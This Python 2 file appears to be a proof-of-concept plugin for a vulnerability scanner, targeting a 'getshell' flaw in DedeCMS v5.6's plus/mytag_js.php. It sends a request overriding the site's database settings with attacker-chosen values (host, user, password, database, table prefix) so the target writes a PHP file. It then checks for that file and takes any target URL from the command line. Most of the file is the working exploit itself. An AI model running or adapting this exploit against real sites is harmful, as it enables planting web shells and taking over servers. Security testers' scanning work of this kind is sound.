#!/usr/bin/env python
# coding=utf-8

import sys

sys.path.append("/Users/imiyoo/workplace/tscanner/")

import re
import time
from misc.common import md5
from teye_web.http.URL import URL
from teye_web.util.error_sql import get_error_sql_key

# urllib2,requests,httplib2
from wCurl import wcurl

from teye_poc.PocScan import PocScan
from LogManager import log

import httplib

httplib.HTTPConnection.debuglevel = 1

from teye_data.vulnmanager import vm


class dedecms_mytag_getshell(PocScan):
    '''
	'''

    def __init__(self):
        '''
		'''
        self._poc_info = {

            'w_hat': {
                'author': "imiyoo",
                'blog': "http://www.imiyoo.com",
                'team': "W.A.T",
                'create_time': "2011-08-25"
            },
            'w_vul': {
                'id': u"WID-2011-1032",
                'title': u"Dedecms v5.6 mytag_js.php getshell漏洞",
                'method': u"GET",
                'tag': u"dedecms",
                'rank': u"高危",
                'info': u"http://www.watscan.com/"
            }
        }

        self._db_info = ('127.0.0.1', 'root', 'root', 'book', 'dede_')
        self._file_key = "plus/" + md5("wat2018") + ".php"
        self._data_key = md5("wattest")
        self._vuln_file = "plus/mytag_js.php"

        # 扫描模式:0为域名模式检测，1为路径模式检测(检测用户输入的URL路径)
        self._scan_mode = 1

    def check(self, url):
        '''
		'''
        log.info(u"正在检测目标是否存在:[%s]..." % self.get_title())
        if not self._scan_mode:
            domain_path = url.get_domain_path()
            exp_url = domain_path.urljoin(self._vuln_file)
            chk_url = domain_path.urljoin(self._file_key)
        else:
            exp_url = url.urljoin(self._vuln_file)
            print exp_url
            chk_url = url.urljoin(self._file_key)

        data = "aid=1&cfg_dbhost=%s&cfg_dbuser=%s&cfg_dbpwd=%s&cfg_dbname=%s&cfg_dbprefix=%s" % self._db_info
        wcurl.get(exp_url, params=data)

        time.sleep(1)

        chk_res = wcurl.get(chk_url)
        if self._find_vuln(chk_res, self._data_key):
            print "test"
            self.security_hole(exp_url)

    def _find_vuln(self, res, key):
        '''
		'''
        body = res.body
        print key
        print body
        if body is None:
            return False

        if body.find(key) > -1:
            return True
        else:
            return False

    def get_name(self):
        '''
		'''
        return self.__class__.__name__


if __name__ == "__main__":
    from optparse import OptionParser

    usage = "usage: %prog [options] arg"
    parser = OptionParser(usage)
    parser.add_option("-u", "--url", action="store", dest="url", default=None, help="Scan the target url")
    (options, args) = parser.parse_args()
    if not options.url:
        parser.print_help()
        sys.exit(-1)
    else:
        url = options.url
        target_url = URL(url)
        check_inst = dedecms_mytag_getshell()
        check_inst.check(target_url)
        print vm.get_all_vuln()
